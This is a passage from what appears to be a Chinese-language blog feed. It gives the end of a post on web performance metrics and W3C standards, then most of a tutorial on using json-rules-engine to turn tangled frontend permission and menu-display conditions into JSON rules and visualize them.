data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/2373519/1652424431078-5ae26104-5175-4336-9bf1-273743481f6b.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="QHpFd"></a></p><h1 id="内容扩展"><a href="#内容扩展" class="headerlink" title="内容扩展"></a>内容扩展</h1><p>W3C 标准只是推荐标准，并没有强制执行的能力。但在 Web 标准领域各浏览器厂商对推荐的标准都很重视，积极的响应，但并非所有的标准都能得到适配。下图是一份 W3C 标准制定的流程示意图：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/gif/2373519/1652759181910-d2c95e08-267a-49ee-b719-246ed596b8e0.gif" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/gif/2373519/1652759181910-d2c95e08-267a-49ee-b719-246ed596b8e0.gif" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><pre><code>一份标准的制定从**工作草案**提出由公众和会员进行讨论形成**最终工作草案**后并再次进行讨论及修订，修订完毕的最终工作草案将列入**候选推荐标准**，此时的规范处于稳定状态，可以开展实验性的实施，在持续一段进行的验证和修复后就会进入到**建议推荐标准**的阶段，W3C会员将对这份标准进行审阅，如果审阅没有通过将打回到**候选标准推荐**，更严重的将直接打回到最初的**工作草案**阶段或**彻底移除**，审阅通过后W3C总监将宣布该规范为**W3C推荐标准**。</code></pre><p><a name="jQUFc"></a></p><h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><p>在这一篇中我们介绍了几个在网页性能紧相关的几项指标，也介绍了从毫秒到纳秒的性能数据获取的 API 和使用的方式，期间我们也演示了通过浏览器提供的<strong>Performance</strong>功能，Chrome 浏览器还内置了 Lighthouse 功能来为我们的网页性能打分。我们通常也可以完全应用这两个工具，那么在需要定制一些私有的性能监控平台的时候 API 就可以发挥更大的功能了。</p><p><a name="No5BV"></a></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://www.w3.org/TR/navigation-timing/">https://www.w3.org/TR/navigation-timing/</a><br /><a href="https://www.w3.org/TR/navigation-timing-2/">https://www.w3.org/TR/navigation-timing-2/</a><br /><a href="https://zhuanlan.zhihu.com/p/82981365">https://zhuanlan.zhihu.com/p/82981365</a></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 监控 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 监控 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>规则引擎在前端的应用</title>
      <link href="/2024/04/19/solution/gui-ze-yin-qing-zai-qian-duan-de-ying-yong/"/>
      <url>/2024/04/19/solution/gui-ze-yin-qing-zai-qian-duan-de-ying-yong/</url>
      
        <content type="html"><![CDATA[<p><a name="K6e07"></a></p><h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h1><p>规则引擎常作为一个独立服务运行在一定体量的产品之中，通过接收有效的数据来做出对业务的合理决策。在前端项目的常年迭代下，对于某些重要的或频繁扩展改造的业务模块由于时间长、注释少、不易阅读等客观问题的遗留会对后期的迭代造成一定困扰，也不免会造成额外的测试压力。所以轻量的、可运行在浏览器端得规则引擎将彻底消灭这样问题的存在。<br><a name="mizAn"></a></p><h1 id="2-规则引擎初探"><a href="#2-规则引擎初探" class="headerlink" title="2. 规则引擎初探"></a>2. 规则引擎初探</h1><p>适用于浏览器端的规则引擎在开源社区已有实现，这里我们就通过<code>json-rules-engine</code>开源项目来走进规则引擎的世界~</p><blockquote><p><code>json-rules-engine</code>由 JSON 数据格式来组合规则，这样既便于规则的阅读也便于规则的持久化存储，还有轻量也是它的特点之一~</p></blockquote><p><a name="LT4kW"></a></p><h2 id="2-1-制定游戏规则"><a href="#2-1-制定游戏规则" class="headerlink" title="2.1 制定游戏规则"></a>2.1 制定游戏规则</h2><p>在某一运动赛事规则的制定时共同约定：<br />1 当比赛进行到 40 分钟时，如果运行员犯规次数达到 5 次及以上的因被罚出场；<br />2 当比赛进行到 48 分钟时，如果运动员犯规次数达到 6 次及以上的因被罚出场；<br><a name="dN8d5"></a></p><h2 id="2-2-搭建规则引擎"><a href="#2-2-搭建规则引擎" class="headerlink" title="2.2 搭建规则引擎"></a>2.2 搭建规则引擎</h2><p><a name="aNj8f"></a></p><h3 id="2-2-1-创建引擎"><a href="#2-2-1-创建引擎" class="headerlink" title="2.2.1 创建引擎"></a>2.2.1 创建引擎</h3><p>通过简单的模块导入并实例化引擎对象即完成了引擎的创建工作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">let &#123; Engine &#125; = require(&#x27;json-rules-engine&#x27;);</span><br><span class="line">let engine = new Engine();</span><br></pre></td></tr></table></figure><p><a name="xZZ9p"></a></p><h3 id="2-2-2-添加规则"><a href="#2-2-2-添加规则" class="headerlink" title="2.2.2 添加规则"></a>2.2.2 添加规则</h3><p>通过 event 对象来定义当规则被命中后所触发的信息，通过<code>conditions</code>对象来定义具体的规则，每个规则至少包含<code>fact</code>、<code>operator</code>、<code>value</code>三部分，分别定义事实名称、操作符和当前规则的阈值或范围，规则和规则之间使用 <code>any</code> 来表示逻辑或和使用 <code>all</code> 来表示逻辑与的关系，这样就组成了这次赛事的具体规则：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">let event = &#123;</span><br><span class="line">  type: &#x27;fouledOut&#x27;,</span><br><span class="line">  params: &#123;</span><br><span class="line">    message: &#x27;Player has fouled out!&#x27;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">let conditions = &#123;</span><br><span class="line">  any: [</span><br><span class="line">        &#123;</span><br><span class="line">            all: [</span><br><span class="line">                &#123; fact: &#x27;gameDuration&#x27;, operator: &#x27;equal&#x27;, value: 40 &#125;,</span><br><span class="line">                &#123; fact: &#x27;personalFoulCount&#x27;, operator: &#x27;greaterThanInclusive&#x27;, value: 5 &#125;,</span><br><span class="line">            ]</span><br><span class="line">        &#125;, &#123;</span><br><span class="line">            all: [</span><br><span class="line">                &#123; fact: &#x27;gameDuration&#x27;, operator: &#x27;equal&#x27;, value: 48 &#125;,</span><br><span class="line">                &#123; fact: &#x27;personalFoulCount&#x27;, operator: &#x27;greaterThanInclusive&#x27;, value: 6 &#125;,</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;;</span><br><span class="line">engine.addRule(&#123; conditions, event &#125;);</span><br></pre></td></tr></table></figure><p>下图是这个赛事规则的可视化规则示意图，在文末将会讲解如何利用可视化工具来高效阅读所定义的规则~</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/2373519/1662108598231-5591c6cb-2a3c-4de6-a1b9-fc6492ff0fd7.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/2373519/1662108598231-5591c6cb-2a3c-4de6-a1b9-fc6492ff0fd7.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="izcpX"></a></p><h3 id="2-2-3-定义-Facts"><a href="#2-2-3-定义-Facts" class="headerlink" title="2.2.3 定义 Facts"></a>2.2.3 定义 Facts</h3><p>这里使用对象来表示一个<strong>Fact</strong>，让它进入到规则引擎并经过每一条规则来判断是否允许通过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let facts = &#123;</span><br><span class="line">    personalFoulCount: 6,</span><br><span class="line">    gameDuration: 40,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="dl0fD"></a></p><h3 id="2-2-4-运行引擎"><a href="#2-2-4-运行引擎" class="headerlink" title="2.2.4 运行引擎"></a>2.2.4 运行引擎</h3><p>通过引擎校验后将在控制台输出 Player has fouled out!的信息，说明这个运动员已经命中了被罚出场的规则~</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const &#123; events &#125; = await engine.run(facts);</span><br><span class="line">events.map(event =&gt; console.log(event.params.message));</span><br></pre></td></tr></table></figure><p><a name="nuERt"></a></p><h1 id="3-线上项目分析应用"><a href="#3-线上项目分析应用" class="headerlink" title="3. 线上项目分析应用"></a>3. 线上项目分析应用</h1><p><a name="YgnwI"></a></p><h2 id="3-1-场景-1-amp-多属性控制菜单"><a href="#3-1-场景-1-amp-多属性控制菜单" class="headerlink" title="3.1 场景 1&amp;多属性控制菜单"></a>3.1 场景 1&amp;多属性控制菜单</h2><p>在线上项目的某一个菜单处出现了同时由 <strong>8</strong> 个属性共同控制一个菜单的显示与隐藏，猜想在最初也只是仅包含一个用户权限和数据状态的控制吧，但随着业务的持续变动导致这块的控制属性持续增加，也是在最近的迭代中又为这个菜单补充了一个属性的控制，其实这些属性中也不全是 <strong>Boolean</strong> 类型的判断，下面通过对比源代码和应用规则引擎后的代码来看一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">   源代码：</span><br><span class="line"></span><br><span class="line">    // item.error_type !== 53</span><br><span class="line">    // !item.not_foreign_nationality_settle &amp;&amp;</span><br><span class="line">    // !item.not_hongkong_macao_taiwan_settle &amp;&amp;</span><br><span class="line">    // !item.is_excess_single &amp;&amp;</span><br><span class="line">    // isSuperAdmin!= &#x27;groupmanager&#x27; &amp;&amp;</span><br><span class="line">    // !isMissingPayMode(item) &amp;&amp;</span><br><span class="line">    // (item.status === 0 || item.status === 4 || item.status === 9) &amp;&amp;</span><br><span class="line">    // showCreateBillBtn(item) &amp;&amp; // 忽略，因函数逻辑不易拆解</span><br><span class="line">    // !item.bankerr&quot;</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">// 引擎规则：</span><br><span class="line">let conditions = &#123;</span><br><span class="line">    all: [</span><br><span class="line">        // 非此状态的允许通过</span><br><span class="line">        &#123; fact: &#x27;error_type&#x27;, operator: &#x27;notEqual&#x27;, value: 53 &#125;,</span><br><span class="line">        // 非组织管理员允许通过</span><br><span class="line">        &#123; fact: &#x27;isSuperAdmin&#x27;, operator: &#x27;notEqual&#x27;, value: &#x27;groupmanager&#x27; &#125;,</span><br><span class="line">        // 状态符合：0 4 9 允许通过</span><br><span class="line">        &#123; fact: &#x27;status&#x27;, operator: &#x27;in&#x27;, value: [0, 4, 9] &#125;,</span><br><span class="line">        // 非外籍人员允许通过</span><br><span class="line">        &#123; fact: &#x27;isForeignNationality&#x27;, operator: &#x27;equal&#x27;, value: false &#125;,</span><br><span class="line">        // 非港澳台人员允许通过</span><br><span class="line">        &#123; fact: &#x27;isHongkongMacaoTaiwanRegion&#x27;, operator: &#x27;equal&#x27;, value: false &#125;,</span><br><span class="line">        // 未超出单笔限额允许通过</span><br><span class="line">        &#123; fact: &#x27;isExcessSingle&#x27;, operator: &#x27;equal&#x27;, value: false &#125;,</span><br><span class="line">        // 支付方式未丢失用户允许通过</span><br><span class="line">        &#123; fact: &#x27;isMissingPayMode&#x27;, operator: &#x27;equal&#x27;, value: false &#125;,</span><br><span class="line">        // 银行卡号未丢失时允许通过（当支付方式为银行卡且卡号丢失时此节点为true）</span><br><span class="line">        &#123; fact: &#x27;isMissingBankCardNumber&#x27;, operator: &#x27;equal&#x27;, value: false &#125;,</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let event = &#123;</span><br><span class="line">    type: &#x27;showAllowSettlement&#x27;,</span><br><span class="line">    params: &#123;</span><br><span class="line">        message: &#x27;You can display the settlement menu.!&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">engine.addRule(&#123; conditions, event &#125;);</span><br></pre></td></tr></table></figure><pre><code>下图是上述规则的可视化示意图，通过图所示，当着 8 个属性均符合条件后才允许通过，这个时候对应的菜单才允许被显示：&lt;br /&gt;![](https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&amp;url=cdn.nlark.com/yuque/0/2022/png/2373519/1662190407772-b7e15ca1-0ebf-4211-be60-0e7d262c4a63.png)</code></pre><p><a name="hJGTo"></a></p><h2 id="3-2-场景-2-amp-多属性多分支控制菜单"><a href="#3-2-场景-2-amp-多属性多分支控制菜单" class="headerlink" title="3.2 场景 2&amp;多属性多分支控制菜单"></a>3.2 场景 2&amp;多属性多分支控制菜单</h2><p>上面的场景 1 你可能看不出来规则引擎带来的便利，可能觉得原来的代码看起来也说的过去，那接着看这个包含多个分支的控制案例。<br />商户开票的功能设计由于不同的开票方式等其他的一系列因素导致这块有 4 个比较大的分支处理，这里我拆分出其中的一个分支来利用规则引擎简单的实现一下：<br><a name="TaUZu"></a></p><h3 id="3-2-1-源项目逻辑分析"><a href="#3-2-1-源项目逻辑分析" class="headerlink" title="3.2.1 源项目逻辑分析"></a>3.2.1 源项目逻辑分析</h3><p>下面是摘自源项目的部分逻辑控制，其中部分的属性和函数背后还有很多的逻辑处理，对于代码的阅读和功能的测试都会造成困扰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">申请开票方式1：</span><br><span class="line">控制菜单显示：</span><br><span class="line">  !permissionSwitch() &amp;&amp;</span><br><span class="line">  ((isSuperAdmin &amp;&amp; projectListCode &amp;&amp; is_allow_apply_invoice) || (projectListCode == &#x27;&#x27; &amp;&amp; is_allow_apply_invoice))</span><br><span class="line">控制菜单触发：</span><br><span class="line">  (settlement_business_scenario_switch &amp;&amp; invoiceDealObj.isShowHistory &amp;&amp; this.invoiceDealObj.historyCanInvoice !== 0) ||</span><br><span class="line">  (invoiceDealObj.isShowHistory &amp;&amp; invoiceDealObj.merchantHistoryCanInvoice !== 0)</span><br></pre></td></tr></table></figure><p><a name="O7UjH"></a></p><h3 id="3-2-2-引擎规则编写"><a href="#3-2-2-引擎规则编写" class="headerlink" title="3.2.2 引擎规则编写"></a>3.2.2 引擎规则编写</h3><p>通过源代码分析控制此菜单的数据达 10 个，通过逻辑与和逻辑或共同控制着 16 条规则的运行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">let conditions = &#123;</span><br><span class="line">    all: [</span><br><span class="line">        &#123; fact: &#x27;invoice_way&#x27;, operator: &#x27;notEqual&#x27;, value: 1 &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            any: [</span><br><span class="line">                &#123;</span><br><span class="line">                    all: [</span><br><span class="line">                        &#123;</span><br><span class="line">                            any: [</span><br><span class="line">                                &#123; fact: &#x27;isSuperAdmin&#x27;, operator: &#x27;equal&#x27;, value: &#x27;superadmin&#x27; &#125;,</span><br><span class="line">                                &#123; fact: &#x27;isSuperAdmin&#x27;, operator: &#x27;equal&#x27;, value: &#x27;groupmanager&#x27; &#125;,</span><br><span class="line">                                &#123;</span><br><span class="line">                                    all: [</span><br><span class="line">                                        &#123; fact: &#x27;isSuperAdmin&#x27;, operator: &#x27;equal&#x27;, value: &#x27;projectmanager&#x27; &#125;,</span><br><span class="line">                                        &#123; fact: &#x27;project_invoice_switch&#x27;, operator: &#x27;equal&#x27;, value: true &#125;,</span><br><span class="line">                                    ]</span><br><span class="line">                                &#125;,</span><br><span class="line">                                &#123;</span><br><span class="line">                                    all: [</span><br><span class="line">                                        &#123; fact: &#x27;isSuperAdmin&#x27;, operator: &#x27;equal&#x27;, value: &#x27;financial&#x27; &#125;,</span><br><span class="line">                                        &#123; fact: &#x27;hasCreatePower&#x27;, operator: &#x27;equal&#x27;, value: 1 &#125;,</span><br><span class="line">                                    ]</span><br><span class="line">                                &#125;,</span><br><span class="line">                            ]</span><br><span class="line">                        &#125;,</span><br><span class="line">                        &#123; fact: &#x27;projectListCode&#x27;, operator: &#x27;notEqual&#x27;, value: &#x27;&#x27; &#125;,</span><br><span class="line">                        &#123; fact: &#x27;is_allow_apply_invoice&#x27;, operator: &#x27;equal&#x27;, value: true &#125;,</span><br><span class="line">                    ]</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    all: [</span><br><span class="line">                        &#123; fact: &#x27;projectListCode&#x27;, operator: &#x27;equal&#x27;, value: &#x27;&#x27; &#125;,</span><br><span class="line">                        &#123; fact: &#x27;is_allow_apply_invoice&#x27;, operator: &#x27;equal&#x27;, value: true &#125;,</span><br><span class="line">                    ]</span><br><span class="line">                &#125;,</span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            any: [</span><br><span class="line">                &#123;</span><br><span class="line">                    all: [</span><br><span class="line">                        &#123; fact: &#x27;settlement_business_scenario_switch&#x27;, operator: &#x27;equal&#x27;, value: true &#125;,</span><br><span class="line">                        &#123; fact: &#x27;isShowHistory&#x27;, operator: &#x27;equal&#x27;, value: true, &#125;,</span><br><span class="line">                        &#123; fact: &#x27;historyCanInvoice&#x27;, operator: &#x27;notEqual&#x27;, value: 0, &#125;,</span><br><span class="line">                    ]</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    all: [</span><br><span class="line">                        &#123; fact: &#x27;isShowHistory&#x27;, operator: &#x27;equal&#x27;, value: true &#125;,</span><br><span class="line">                        &#123; fact: &#x27;merchantHistoryCanInvoice&#x27;, operator: &#x27;notEqual&#x27;, value: 0 &#125;</span><br><span class="line">                    ]</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let event = &#123;</span><br><span class="line">    type: &#x27;allowInvoicing&#x27;,</span><br><span class="line">    params: &#123;</span><br><span class="line">        message: &#x27;Invoicing method 1 allowed!&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="PWwoR"></a></p><h3 id="3-2-3-规则示意图"><a href="#3-2-3-规则示意图" class="headerlink" title="3.2.3 规则示意图"></a>3.2.3 规则示意图</h3><p>当规则变多以后，纯代码的阅读也会变得更加费劲，所以这个时候就可以利用可视化的工具来通过图的方式阅读，下面这几张图就是对上面案例规则的描述：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/2373519/1662108655020-46367c2b-4626-4c46-8457-aacddfb2a7b3.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/2373519/1662108655020-46367c2b-4626-4c46-8457-aacddfb2a7b3.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="hKpx0"></a></p><h1 id="4-规则可视化方案"><a href="#4-规则可视化方案" class="headerlink" title="4. 规则可视化方案"></a>4. 规则可视化方案</h1><p>规则可视化的前提就需要将编写的引擎规则转为 JSON 对象，通过加载 JSON 对象实现规则的可视化工作。<br><a name="BzNbe"></a></p><h2 id="4-1-规则-JSON-化处理"><a href="#4-1-规则-JSON-化处理" class="headerlink" title="4.1 规则 JSON 化处理"></a>4.1 规则 JSON 化处理</h2><p><code>json-rules-engine</code>模块中的 Rule 对象提供了 toJSON()函数，我们直接编写脚本来得到一份 json 化后的规则数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">const &#123; Rule &#125; = require(&quot;json-rules-engine&quot;);</span><br><span class="line">const json = new Rule(&#123;</span><br><span class="line">  conditions: &#123;</span><br><span class="line">    any: [</span><br><span class="line">      &#123;</span><br><span class="line">        all: [</span><br><span class="line">          &#123; fact: &quot;gameDuration&quot;, operator: &quot;equal&quot;, value: 40 &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            fact: &quot;personalFoulCount&quot;,</span><br><span class="line">            operator: &quot;greaterThanInclusive&quot;,</span><br><span class="line">            value: 5,</span><br><span class="line">          &#125;,</span><br><span class="line">        ],</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        all: [</span><br><span class="line">          &#123; fact: &quot;gameDuration&quot;, operator: &quot;equal&quot;, value: 48 &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            fact: &quot;personalFoulCount&quot;,</span><br><span class="line">            operator: &quot;greaterThanInclusive&quot;,</span><br><span class="line">            value: 6,</span><br><span class="line">          &#125;,</span><br><span class="line">        ],</span><br><span class="line">      &#125;,</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">  event: &#123;</span><br><span class="line">    type: &quot;fouledOut&quot;,</span><br><span class="line">    params: &#123;</span><br><span class="line">      message: &quot;Player has fouled out!&quot;,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;).toJSON();</span><br><span class="line">console.log(json);</span><br></pre></td></tr></table></figure><p>在得到规则数据后需要对数据做简易处理，通过<code>name</code>来命名这个规则的名称以示区分，在<code>decisions</code>中插入得到的规则数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;rule&quot;,</span><br><span class="line">  &quot;decisions&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;conditions&quot;: &#123;</span><br><span class="line">        &quot;priority&quot;: 1,</span><br><span class="line">        &quot;any&quot;: [</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;priority&quot;: 1,</span><br><span class="line">            &quot;all&quot;: [</span><br><span class="line">              &#123;</span><br><span class="line">                &quot;operator&quot;: &quot;equal&quot;,</span><br><span class="line">                &quot;value&quot;: 40,</span><br><span class="line">                &quot;fact&quot;: &quot;gameDuration&quot;</span><br><span class="line">              &#125;,</span><br><span class="line">              &#123;</span><br><span class="line">                &quot;operator&quot;: &quot;greaterThanInclusive&quot;,</span><br><span class="line">                &quot;value&quot;: 5,</span><br><span class="line">                &quot;fact&quot;: &quot;personalFoulCount&quot;</span><br><span class="line">              &#125;</span><br><span class="line">            ]</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;priority&quot;: 1,</span><br><span class="line">            &quot;all&quot;: [</span><br><span class="line">              &#123;</span><br><span class="line">                &quot;operator&quot;: &quot;equal&quot;,</span><br><span class="line">                &quot;value&quot;: 48,</span><br><span class="line">                &quot;fact&quot;: &quot;gameDuration&quot;</span><br><span class="line">              &#125;,</span><br><span class="line">              &#123;</span><br><span class="line">                &quot;operator&quot;: &quot;greaterThanInclusive&quot;,</span><br><span class="line">                &quot;value&quot;: 6,</span><br><span class="line">                &quot;fact&quot;: &quot;personalFoulCount&quot;</span><br><span class="line">              &#125;</span><br><span class="line">            ]</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;priority&quot;: 1,</span><br><span class="line">      &quot;event&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;fouledOut&quot;,</span><br><span class="line">        &quot;params&quot;: &#123;</span><br><span class="line">          &quot;message&quot;: &quot;Player has fouled out!&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="uQz9e"></a></p><h2 id="4-2-规则可视化处理"><a href="#4-2-规则可视化处理" class="headerlink" title="4.2 规则可视化处理"></a>4.2 规则可视化处理</h2><p><code>json-rule-editor</code>开源项目可以快速完成引擎规则的可视化，<a href="https://www.json-rule-editor.com/#/home">json-rule-editor</a> 是该项目部署的在线页面，通过选择规则文件夹、上传规则文件、更新，在选择 rule 